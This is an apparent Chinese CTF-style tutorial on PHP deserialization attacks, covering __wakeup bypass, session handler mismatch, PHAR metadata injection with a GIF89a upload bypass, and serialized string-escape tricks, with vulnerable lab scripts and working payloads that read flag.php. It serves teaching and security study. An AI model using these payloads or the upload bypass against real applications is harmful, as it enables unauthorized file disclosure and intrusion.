## ****最简单的反序列化****

 ** **<?php****  
 ** **require_once**** ('flag.php');  
highlight_file(__FILE__);  
 ** **class**** A{  
 ** **private**** $user = 'test';  
  
 ** **function**** __destruct(){  
 ** **if**** ($this->user == 'admin') {  
var_dump($GLOBALS);  
}  
}  
}  
  
$data = $_GET['data'];  
unserialize($data);

当我们反序列化后user为admin时输出$GLOBALS，输出当前php页面全局变量

我们构造payload如下

 ** **<?php****  
 ** **class**** A{  
 ** **private**** $user = 'admin';  
}  
  
 ** **echo**** urlencode(serialize( ** **new**** A()));

运行获得url编码序列化后的值为O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00user%22%3Bs%3A5%3A%22admin%22%3B%7D

将其赋值给data后即可输出全局变量

![1650442396_625fc09cbfad34a2c1b18.png!small?1650442397371](https://image.3001.net/images/20220420/1650442396_625fc09cbfad34a2c1b18.png!small?1650442397371)

##  ** **__wakeup绕过****

在反反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。

影响版本

php5.0.0 ~ php5.6.25

php7.0.0 ~ php7.0.10

php源码

 ** **<?php****  
highlight_file(__FILE__);  
 ** **class**** A{  
 ** **private**** $filename = 'test.txt';  
  
 ** **public**** ** **function**** __wakeup() {  
$this->filename = 'test.txt';  
}  
  
 ** **public**** ** **function**** __destruct() {  
 ** **echo**** file_get_contents($this->filename);  
}  
  
}  
  
$data = $_GET['data'];  
unserialize($data);

php语言的特性为在反序列化时，先执行__wakeup()魔术方法，才会执行__destruct()魔术方法

也就是说当我们使用payload

 ** **<?php****  
 ** **class**** A{  
 ** **private**** $filename = 'flag.php';  
}  
  
 ** **echo**** urlencode(serialize( ** **new**** A()));

O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D

去反序列化时

结果为

![1650442405_625fc0a5586d1af365a82.png!small?1650442406140](https://image.3001.net/images/20220420/1650442405_625fc0a5586d1af365a82.png!small?1650442406140)

可以发现我们在反序列化时修改的$filename的值在__wakeup()函数时由flag.php修改为了test.txt

绕过__wakeup()函数时将对象属性个数的值大于真实的属性个数时即可绕过

即O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D

改为，只需要将对象个数大于1即可，2，3，4等等都行，这里我使用2

O%3A1%3A%22A%22%3A2%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D

即可获取想要的文件的内容

![1650442413_625fc0ad588b06a794a8e.png!small?1650442414521](https://image.3001.net/images/20220420/1650442413_625fc0ad588b06a794a8e.png!small?1650442414521)

##  ** **private protect变量构造****

如最开始

在构造payload时

将所得的payload进行url编码即可

##  ** **Session反序列化漏洞****

PHP中的Session经序列化后存储，读取时再进行反序列化。

相关配置：

session.save_path="" //设置session的存储路径

session.save_handler="" //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)

session.auto_start boolen //指定会话模块是否在请求开始时启动一个会话默认为0不启动

session.serialize_handler string //定义用来序列化/反序列化的处理器名字。默认使用php

PHP有3种序列化处理器

处理器

|

对应的存储格式  
  
---|---  
  
php

|

键名+竖线（|）+经过serialize()函数处理过的值  
  
php_binary

|

键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值  
  
php_serialize

|

经过serialize()函数处理过的值，会将键名和值当作一个数组序列化  
  
代码

 ** **<?php****  
  
session_start();  
  
$_SESSION['test'] = $_REQUEST['test'];  
 ** **echo**** session_id();

执行后可以看到

![1650442426_625fc0ba8e15864ff1d5b.png!small?1650442427076](https://image.3001.net/images/20220420/1650442426_625fc0ba8e15864ff1d5b.png!small?1650442427076)

命名方式为sess_session_id()

存储内容为序列化后的session:test|s:4:"test";

不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的session序列化格式不同，就可能产生反序列化漏洞

因为index.php与session.php采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的

也就是说将数据通过session.php序列化后将数据存入的文件与index.php反序列化获取反序列化值的文件相同

从而达到反序列化攻击的目的

index.php

 ** **<?php****  
ini_set('session.serialize_handler', 'php');  
  
session_start();  
  
 ** **class**** A {  
 ** **public**** $user = 'test.txt';  
  
 ** **function**** __wakeup() {  
 ** **echo**** "__wakeup<br/>";  
}  
  
 ** **function**** __destruct() {  
 ** **echo**** $this->filename;  
}  
}

generate.php

 ** **<?php****  
 ** **class**** A{  
 ** **public**** $filename = 'flag.php';  
}  
  
 ** **echo**** serialize( ** **new**** A);

session.php

 ** **<?php****  
ini_set('session.serialize_handler', 'php_serialize');  
  
session_start();  
  
$_SESSION['test'] = $_REQUEST['test'];  
 ** **echo**** session_id();

首先通过generate.php构造payload

O:1:"A":1:{s:8:"filename";s:8:"flag.php";}

将O:1:"A":1:{s:8:"filename";s:8:"flag.php";}前面加一个|

即可将反序列化的值存入到session中使index.php反序列化

![1650442437_625fc0c59765faf27ac58.png!small?1650442437854](https://image.3001.net/images/20220420/1650442437_625fc0c59765faf27ac58.png!small?1650442437854)

即可完成session反序列化攻击

![1650442446_625fc0cee156ec82b0574.png!small?1650442447630](https://image.3001.net/images/20220420/1650442446_625fc0cee156ec82b0574.png!small?1650442447630)

##  ** **PHAR利用****

###  ** **1、PHAR简介****

PHAR ("PHp
ARchive")是PHP里类似于JAR的一种打包文件，在PHP5.3或更高版本默认开启，这个特性使得PHP也可以像Java一样方便地实现应用程序打包和组件化，一个应用程序可以打成一个PHAR包，直接方法PHP-FPM中运行

###  ** **2、PHAR文件结构****

PHAR文件由3或4个部分组成

(1) stub //phar文件头

stub就是一个简单的php文件，最简文件头为：

 ** **<?php****__HALF_COMPILER(); ****? >****

文件头中必须包含__HALF_COMPILER()除此之外没有限制。（PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测）

(2)manifest describing the contents //PHAR文件描述该部分存储文件名、文件大小等信息，如下图所示

![1650442457_625fc0d9c74f0a92b0493.png!small?1650442458880](https://image.3001.net/images/20220420/1650442457_625fc0d9c74f0a92b0493.png!small?1650442458880)

图中标出的地方，存储了经serialize()的Meta-data，有序列化过程必有反序列化过程，这就是我们的注入点

(3) the file contents

PHAR文件内容

(4) [optional] a signature for verifying Phar integrity (phar file format
only) // 可选的签名部分， 支持MD5和SHA1

![1650442466_625fc0e22fe2fb516fd5d.png!small?1650442466932](https://image.3001.net/images/20220420/1650442466_625fc0e22fe2fb516fd5d.png!small?1650442466932)

###  ** **攻击方法****

2018年Black Hat研究院Sam Thomas的议题：

It’s a PHP unserialization vulnerability Jim, but not as we know
it提供了一种新的php反序列化攻击姿势。PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar://协议解析时Meta-data部分会被反序列化，这个反序列化过程就是我们的攻击点，Meta-data部分填充payload。

漏洞利用条件：

在目标系统上投放一个装在payload的可访问的PHAR文件，通过文件系统函数利用phar://伪协议解析目标PHAR文件。

注意：要将php.ini中的phar.readonly选项设置为off，否则无法生成phar文件

testPhar.php

 ** **<?php****  
  
 ** **class**** A {  
}  
$phar = ****new**** Phar('phar.phar'); //后缀名必须为phar  
$phar->startBuffering();  
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub  
$o = ****new**** A();  
$o->data = 'cmacckk';  
$phar->setMetadata($o); // 将自定义的meta-data存入manifest  
$phar->addFromString('test.txt', 'test'); // 添加要压缩的文件  
// 签名自动计算  
$phar->stopBuffering();  
  
 ** **? >****

可以从箭头中看到序列化后结果

![1650442481_625fc0f16c0da66537b44.png!small?1650442482169](https://image.3001.net/images/20220420/1650442481_625fc0f16c0da66537b44.png!small?1650442482169)

箭头标出Meta-data部分，可以看到为序列化后结果

index.php

 ** **<?php****  
  
 ** **class**** A {  
 ** **function**** __destruct() {  
 ** **echo**** "<br>destruct called";  
}  
}  
  
$filename = "phar://phar.phar/test.txt";  
 ** **echo**** file_get_contents($filename);

![1650442493_625fc0fd7d2ab1dba74ad.png!small?1650442493854](https://image.3001.net/images/20220420/1650442493_625fc0fd7d2ab1dba74ad.png!small?1650442493854)

可以看到输出了之前打包的phar文件中,test.txt文件的内容test，并成功实例化A对象，调用了析构函数(__destruct)

由于PHP仅通过stub部分判断文件是否为PHAR文件，我们可以通过添加文件头、修改后缀的方式绕过上传检测

 ** **<?php****  
  
 ** **class**** A {  
}  
$phar = ****new**** Phar('phar.phar'); //后缀名必须为phar  
$phar->startBuffering();  
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头绕过  
$o = ****new**** A();  
$phar->setMetadata($o); // 将自定义的meta-data存入manifest  
$phar->addFromString('test.txt', 'test'); // 添加要压缩的文件  
// 签名自动计算  
$phar->stopBuffering();  
  
 ** **? >****

##  ** **PHP反序列化字符串逃逸(变长)****

示例代码

 ** **<?php****  
  
highlight_file(__FILE__);  
 ** **require_once**** ('flag.php');  
 ** **function**** waf($str) {  
 ** **return**** str_replace('bb', 'ccc', $str);  
}  
  
 ** **class**** A {  
 ** **public**** $name = 'admin';  
 ** **public**** $pass = '123456';  
}  
  
$c = unserialize(waf(serialize( ** **new**** A())));  
 ** **if**** ($c->pass === 'admin') {  
 ** **echo**** $flag;  
} ****else**** {  
 ** **echo**** "no no no";  
}

在代码中，当$pass为admin时，才会输出flag

在这里有一个函数waf

waf函数会将bb变为ccc

即bb会变为ccc，在这个过程中反序列化时便会少读取一个字符

使用test.php查看当前序列化结果

 ** **<?php****  
 ** **function**** waf($str) {  
 ** **return**** str_replace('bb', 'ccc', $str);  
}  
  
 ** **class**** A {  
 ** **public**** $name = 'admin';  
 ** **public**** $pass = '123456';  
}  
  
$c = (serialize( ** **new**** A()));  
 ** **echo**** $c;

![1650442511_625fc10f0473b7bb2f6b1.png!small?1650442511256](https://image.3001.net/images/20220420/1650442511_625fc10f0473b7bb2f6b1.png!small?1650442511256)

我们要让红线部分的数据修改为admin，在代码里修改

 ** **<?php****  
 ** **function**** waf($str) {  
 ** **return**** str_replace('bb', 'ccc', $str);  
}  
  
 ** **class**** A {  
 ** **public**** $name = 'admin';  
 ** **public**** $pass = 'admin';  
}  
  
$c = (serialize( ** **new**** A()));  
 ** **echo**** $c;

![1650442523_625fc11b4a7bd42394a7d.png!small?1650442524645](https://image.3001.net/images/20220420/1650442523_625fc11b4a7bd42394a7d.png!small?1650442524645)

所以我们要逃逸的字符串为";s:4:"pass";s:5:"admin";}

![1650442528_625fc120b19c0fd3daf97.png!small?1650442529009](https://image.3001.net/images/20220420/1650442528_625fc120b19c0fd3daf97.png!small?1650442529009)

按照一个bb转变为ccc会逃逸1个字符，如果我们要逃逸26个字符，那么我们需要26个bb

![1650442532_625fc124f387d12ff2da5.png!small?1650442533346](https://image.3001.net/images/20220420/1650442532_625fc124f387d12ff2da5.png!small?1650442533346)

所以生成的name值为bbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:5:"admin";}

生成payload

 ** **<?php****  
  
highlight_file(__FILE__);  
 ** **require_once**** ('flag.php');  
 ** **function**** waf($str) {  
 ** **return**** str_replace('bb', 'ccc', $str);  
}  
  
 ** **class**** A {  
 ** **public**** $name =
'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:5:"admin";}';  
 ** **public**** $pass = '123456';  
}  
  
 ** **echo**** "<br>serialize a:<br>" . serialize( ** **new**** A()) . "<br>";  
 ** **echo**** "waf serialize a:<br>" . waf(serialize( ** **new**** A())) .
"<br>";  
$c = unserialize(waf(serialize( ** **new**** A())));  
 ** **if**** ($c->pass === 'admin') {  
 ** **echo**** $flag;  
} ****else**** {  
 ** **echo**** "no no no";  
}

![1650442543_625fc12fb55c064eed8b1.png!small?1650442545778](https://image.3001.net/images/20220420/1650442543_625fc12fb55c064eed8b1.png!small?1650442545778)

可以看到在经过waf函数后，逃逸后的反序列化长度符合，可以正常反序列化，反序列化}前的值

最终改变了$pass的值获取flag

##  ** **PHP反序列化字符串逃逸(变短)****

 ** **<?php****  
  
 ** **require_once**** ('flag.php');  
highlight_file(__FILE__);  
 ** **function**** waf($str) {  
 ** **return**** preg_replace("/ctf|flag/i", "", $str);  
}  
  
$test['name'] = $_GET['name'];  
$test['sign'] = $_GET['sign'];  
$test['year'] = '2021';  
  
  
$tmp = waf(serialize($test));  
 ** **echo**** "<br>" . $tmp . "<br>";  
  
$result = unserialize($tmp);  
 ** **echo**** $result['year'];  
 ** **if**** ($result['year'] === '2100') {  
 ** **echo**** $flag;  
}

###  ** **第一步****

首先我们要明确要逃逸的字符串

在这里要时year为2100，所以我们构造payload

 ** **<?php****  
  
 ** **function**** waf($str) {  
 ** **return**** preg_replace("/ctf|flag/i", "", $str);  
}  
  
$test['name'] = 'cmacckk';  
$test['sign'] = 'test';  
$test['year'] = '2100';  
  
 ** **echo**** serialize($test) . " ";  
$tmp = waf(serialize($test));  
 ** **echo**** $tmp;

我们需要逃逸这个部分

![1650442553_625fc139720f609f8dab0.png!small?1650442553711](https://image.3001.net/images/20220420/1650442553_625fc139720f609f8dab0.png!small?1650442553711)

###  ** **第二步****

我们需要在这个字符串之前添加一个字符或字符串

这里我添加一个C

将sign的值改为"C;s:4:"sign";s:4:"test";s:4:"year";s:4:"2100";}

 ** **<?php****  
  
 ** **function**** waf($str) {  
 ** **return**** preg_replace("/ctf|flag/i", "", $str);  
}  
  
$test['name'] = 'cmacckk';  
$test['sign'] = 'C";s:4:"sign";s:4:"test";s:4:"year";s:4:"2100";}';  
$test['year'] = '2100';  
  
 ** **echo**** serialize($test);

运行

![1650442559_625fc13fa8013a85935a8.png!small?1650442559938](https://image.3001.net/images/20220420/1650442559_625fc13fa8013a85935a8.png!small?1650442559938)

###  ** **第三步****

查看";s:4:"sign";s:48:"C的长度

![1650442564_625fc144a156ae760732c.png!small?1650442564857](https://image.3001.net/images/20220420/1650442564_625fc144a156ae760732c.png!small?1650442564857)

发现长度为20

在这里的waf函数中，将ctf或flag替换为''，所以一个ctf能逃逸3个字符，一个flag能逃逸4个字符

我们需要逃逸20个字符

则仅需要5个flag即可

![1650442571_625fc14b077a2067bcf17.png!small?1650442571339](https://image.3001.net/images/20220420/1650442571_625fc14b077a2067bcf17.png!small?1650442571339)

最终传值结果为

![1650442579_625fc15361268bfa69819.png!small?1650442579818](https://image.3001.net/images/20220420/1650442579_625fc15361268bfa69819.png!small?1650442579818)

参考<https://www.cnblogs.com/ichunqiu/p/10484832.html>

  

